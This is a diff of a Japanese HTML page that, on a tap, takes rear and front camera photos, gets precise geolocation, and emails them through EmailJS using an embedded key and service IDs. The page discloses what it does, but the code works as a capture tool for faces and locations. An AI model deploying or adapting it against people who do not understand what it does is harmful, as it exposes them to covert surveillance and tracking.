@@ -89,32 +89,265 @@
 
 <!-- EmailJS SDK -->
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>emailjs.init("cPjKBUm_i6HebDQF7");</script>
+
+</head>
+<body>
+<button class="debug-toggle" onclick="toggleDebug()">Debug</button>
+
+<div class="container">
+    <h1>📱 内カメ・外カメ撮影アプリ</h1>
+    <p>クリック/タッチで内カメと外カメの写真を撮り、位置情報と動画再生後にメール送信します</p>
+    
+    <div class="touch-area" id="touchArea">
+        <h2>📱 ここをクリック/タッチで実行</h2>
+        <p>PC: クリック | スマホ: タッチ</p>
+        <div style="font-size: 12px; margin-top: 10px; opacity: 0.8;">
+            外カメ写真 → 内カメ写真 → 位置情報取得 → 動画再生 → メール送信
+        </div>
+    </div>
+    
+    <div class="status" id="status">待機中...</div>
+    
+    <div class="debug-info" id="debugInfo"></div>
+    
+    <div class="media-container">
+        <video id="cameraVideo" autoplay muted style="display:none;"></video>
+        <canvas id="photoCanvas" style="display:none;"></canvas>
+        <img id="capturedPhotoRear" style="display:none;" alt="外カメ写真">
+        <img id="capturedPhotoFront" style="display:none;" alt="内カメ写真">
+        <video id="playbackVideo" style="display:none;" controls></video>
+    </div>
+    
+    <div class="data-display" id="locationData" style="display:none;"></div>
+    <div class="data-display" id="photoDataRear" style="display:none;"></div>
+    <div class="data-display" id="photoDataFront" style="display:none;"></div>
+    <div class="data-display" id="videoData" style="display:none;"></div>
+</div>
+
 <script>
-  emailjs.init("cPjKBUm_i6HebDQF7"); // 公開鍵
+    // DOM取得
+    const status = document.getElementById('status');
+    const debugInfo = document.getElementById('debugInfo');
+    const touchArea = document.getElementById('touchArea');
+    const cameraVideo = document.getElementById('cameraVideo');
+    const photoCanvas = document.getElementById('photoCanvas');
+    const capturedPhotoRear = document.getElementById('capturedPhotoRear');
+    const capturedPhotoFront = document.getElementById('capturedPhotoFront');
+    const playbackVideo = document.getElementById('playbackVideo');
+    const locationData = document.getElementById('locationData');
+    const photoDataRear = document.getElementById('photoDataRear');
+    const photoDataFront = document.getElementById('photoDataFront');
+    const videoData = document.getElementById('videoData');
 
-  async function sendEmail({ photoRear, photoFront, location, videoPlayed }) {
-    updateStatus("✉️ メール送信中...", 'warning');
-    try {
-      const templateParams = {
-        photo_rear: photoRear,
-        photo_front: photoFront,
-        location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
-        video_status: videoPlayed ? "✅ 動画再生成功" : "⚠️ 動画再生失敗",
-        date: new Date().toLocaleString()
-      };
+    let isProcessing = false;
+    let lastTouchTime = 0;
+    let debugMode = false;
+    let mediaStream = null;
 
-      await emailjs.send("service_ja2c09x", "template_2fp2jrg", templateParams);
-      updateStatus("✉️ メール送信完了", "success");
-      logDebug("✅ EmailJS送信成功");
+    const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIXdHJhawAAAFx0a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAALAAAACQAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAACRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAALuAAAAAAABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABz21pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAY9zdGJsAAAAr3N0c2QAAAAAAAAAAQAAAJ9hdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAALAAgABIAAAASAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGP//AAAALWF2Y0MBQsAN/+EAFWdCwA3959l7BQAAAwABAAADADIPFi2WAQAEaO+jyyLA/fj4AAAAABx1dWlka2hA8l8kT8W6OaUbzwMj8wAAAAAAAAAYc3R0cwAAAAAAAAABAAAAAQAAAAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAAEwAAAAEAAAAUc3RjbwAAAAAAAAABAAAALAAAAGB1ZHRhAAAAWG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMjkuMTAw";
 
-    } catch (e) {
-      console.error("❌ EmailJS送信失敗:", e);
-      logDebug(`❌ EmailJS送信エラー詳細: ${JSON.stringify(e)}`);
-      throw new Error("メールの送信に失敗しました");
+    // デバッグログ
+    function logDebug(msg) {
+        const t = new Date().toLocaleTimeString();
+        const line = `[${t}] ${msg}`;
+        console.log(line);
+        if(debugMode){
+            debugInfo.innerHTML += line + "<br>";
+            debugInfo.scrollTop = debugInfo.scrollHeight;
+        }
     }
-  }
-</script>
+    function toggleDebug(){
+        debugMode = !debugMode;
+        debugInfo.style.display = debugMode ? 'block' : 'none';
+        if(debugMode) debugInfo.innerHTML = "<strong>デバッグモード開始</strong><br>";
+    }
+    function updateStatus(msg,type='info'){
+        status.textContent = msg;
+        status.className = `status ${type}`;
+        logDebug(`Status [${type}]: ${msg}`);
+    }
 
+    // 写真撮影（facingMode指定）
+    async function capturePhotoByCamera(facingMode){
+        updateStatus(`📸 ${facingMode}カメラ起動中...`, 'warning');
+
+        try {
+            if(mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+                mediaStream = null;
+            }
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode },
+                audio: false
+            });
+
+            cameraVideo.srcObject = mediaStream;
+            cameraVideo.style.display = 'block';
+
+            await new Promise(resolve => setTimeout(resolve, 2000)); // 2秒待つ
+
+            const ctx = photoCanvas.getContext('2d');
+            photoCanvas.width = cameraVideo.videoWidth || 640;
+            photoCanvas.height = cameraVideo.videoHeight || 480;
+
+            ctx.drawImage(cameraVideo, 0, 0, photoCanvas.width, photoCanvas.height);
+
+            const base64 = photoCanvas.toDataURL('image/jpeg', 0.8);
+
+            mediaStream.getTracks().forEach(t => t.stop());
+            cameraVideo.style.display = 'none';
+
+            updateStatus(`📸 ${facingMode}カメラ撮影完了`, 'success');
+            return base64;
+
+        } catch(e){
+            updateStatus(`📸 ${facingMode}カメラエラー`, 'error');
+            throw new Error(`${facingMode}カメラアクセスエラー: ${e.message}`);
+        }
+    }
+
+    // 位置情報取得
+    async function getLocation(){
+        updateStatus("📍 位置情報取得中...", 'warning');
+
+        return new Promise((resolve,reject) => {
+            if(!navigator.geolocation){
+                reject(new Error("位置情報非対応"));
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const loc = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    locationData.innerHTML = `<strong>位置情報:</strong><br>
+                        緯度: ${loc.latitude}<br>
+                        経度: ${loc.longitude}<br>
+                        精度: ${loc.accuracy}m<br>
+                        時刻: ${loc.timestamp}`;
+                    locationData.style.display = 'block';
+                    updateStatus("📍 位置情報取得完了", 'success');
+                    resolve(loc);
+                },
+                err => {
+                    updateStatus("📍 位置情報エラー", 'error');
+                    reject(new Error(`位置情報エラー: ${err.message}`));
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // 動画再生
+    async function playSampleVideo(){
+        updateStatus("🎬 動画再生中...", 'warning');
+        playbackVideo.src = sampleVideoBase64;
+        playbackVideo.style.display = 'block';
+
+        videoData.innerHTML = `<strong>動画データ:</strong><br>サイズ: ${Math.round(sampleVideoBase64.length/1024)} KB<br>データ: ${sampleVideoBase64.substring(0,100)}...`;
+        videoData.style.display = 'block';
+
+        await playbackVideo.play();
+        updateStatus("🎬 動画再生開始", 'success');
+    }
+
+    // EmailJS送信
+    async function sendEmail({photoRear, photoFront, location, videoPlayed}){
+        updateStatus("✉️ メール送信中...", 'warning');
+        try {
+            const templateParams = {
+                photo_rear: photoRear,
+                photo_front: photoFront,
+                location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
+                video_status: videoPlayed ? "動画再生完了" : "動画再生無し",
+                date: new Date().toLocaleString()
+            };
+            await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
+            updateStatus("✉️ メール送信完了", 'success');
+            logDebug("EmailJS送信成功");
+        } catch(e) {
+            updateStatus("✉️ メール送信失敗", 'error');
+            logDebug(`EmailJS送信エラー: ${e.message}`);
+            throw new Error("メール送信に失敗しました");
+        }
+    }
+
+    // フル処理
+    async function executeFullProcess(){
+        logDebug("処理開始");
+        try {
+            const photoRear = await capturePhotoByCamera("environment");
+            capturedPhotoRear.src = photoRear;
+            capturedPhotoRear.style.display = "block";
+            photoDataRear.innerHTML = `<strong>外カメ写真サイズ:</strong> ${Math.round(photoRear.length/1024)} KB`;
+            photoDataRear.style.display = "block";
+
+            const photoFront = await capturePhotoByCamera("user");
+            capturedPhotoFront.src = photoFront;
+            capturedPhotoFront.style.display = "block";
+            photoDataFront.innerHTML = `<strong>内カメ写真サイズ:</strong> ${Math.round(photoFront.length/1024)} KB`;
+            photoDataFront.style.display = "block";
+
+            const location = await getLocation();
+
+            let videoPlayed = false;
+            try {
+                await playSampleVideo();
+                videoPlayed = true;
+            } catch(e) {
+                logDebug(`動画再生失敗: ${e.message}`);
+                updateStatus("🎬 動画再生に失敗しましたが処理を続行します", "warning");
+            }
+
+            await sendEmail({photoRear, photoFront, location, videoPlayed});
+
+            document.body.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
+            updateStatus("✅ 全処理完了！", "success");
+
+        } catch(e) {
+            logDebug(`エラー発生: ${e.message}`);
+            document.body.style.background = 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)';
+            updateStatus(`❌ エラー: ${e.message}`, "error");
+        } finally {
+            isProcessing = false;
+            setTimeout(() => {
+                document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+                updateStatus("待機中...", "info");
+            }, 5000);
+        }
+    }
+
+    // タッチ・クリック処理
+    function handleTouch(e){
+        e.preventDefault();
+        const now = Date.now();
+        if(now - lastTouchTime < 2500){
+            logDebug("クールダウン中");
+            return;
+        }
+        if(isProcessing){
+            logDebug("処理中のため無視");
+            return;
+        }
+        lastTouchTime = now;
+        isProcessing = true;
+        document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
+        updateStatus("🔄 処理開始...", "warning");
+        executeFullProcess();
+    }
+
+    // イベント登録
+    touchArea.addEventListener('click', handleTouch);
+    touchArea.addEventListener('touchstart', handleTouch, {passive:false});
+
+    // 初期化表示
+    updateStatus("📱 準備完了！クリック/タッチで開始", "success");
+    logDebug("アプリ初期化完了");
+</script>
 
 </body>
 </html>
